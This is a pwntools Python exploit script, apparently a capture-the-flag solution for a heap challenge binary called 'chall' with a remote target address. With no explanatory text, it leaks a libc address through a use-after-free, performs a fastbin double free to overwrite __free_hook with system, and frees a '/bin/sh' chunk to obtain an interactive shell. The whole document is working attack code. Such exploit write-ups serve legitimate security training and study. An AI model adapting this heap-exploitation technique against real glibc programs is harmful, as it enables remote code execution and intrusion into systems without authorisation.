#!/usr/bin/env python
# coding=utf-8
from pwn import *
local = 1
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./chall")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    main_arena=0x3ebc40
else:
    a=remote("34.92.96.238","10001")
    libc=ELF("lib/libc.so.6")
    main_arena=libc.symbols["main_arena"]
elf=ELF("./chall")

def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x000000000000CE8)
    ''')
def menu(index):
    a.recvuntil("Input your choice:")
    a.sendline(str(index))
def add(size,name,call):
    menu(1)
    a.recvuntil("Please input the size of girl's name\n")
    a.sendline(str(size))
    a.recvuntil("please inpute her name:\n")
    a.send(name)
    a.recvuntil("please input her call:\n")
    a.send(call)
def show(index):
    menu(2)
    a.recvuntil("Please input the index:\n")
    a.sendline(str(index))
def delete(index):
    menu(4)
    a.recvuntil("Please input the index:\n")
    a.sendline(str(index))
add(0x100,"AAAA","AAAA")#0
for i in range(7):            #fill the tcache
    add(0x100,"AAA","AAA")
for i in range(1,8):
    delete(i)
delete(0)
show(0)
a.recvuntil("name:\n")
libc_base=u64(a.recv(6).ljust(8,'\x00'))-96-main_arena
success("libc_base ==> 0x%x"%libc_base)
add(0x68,"AAA","aa")#8
add(0x68,"AAA","aa")#9
add(0x68,"AAA","aa")#10

for i in range(7):              #fill the tcache
    add(0x68,"AA","aa")# 17 
for i in range(11,11+7):
    delete(i)

delete(8)
delete(9)
delete(8)
for i in range(7):
    add(0x68,"AAA","bbb")#最后一个是24
add(0x200,"/bin/sh\x00","AAA")  #25
#fake_chunk=0x7ffff7dcfc15-8-0x7ffff79e4000+libc_base
fake_chunk=libc_base+libc.symbols["__free_hook"]
#one_gadget=libc_base+0x10a38c
system_addr=libc_base+libc.symbols["system"]
add(0x68,p64(fake_chunk),"aa")#25
add(0x68,"AAA","AAA")
add(0x68,"AAA","AAAA")
payload=p64(system_addr)
add(0x68,payload,"AAA")
delete(25)
a.interactive()
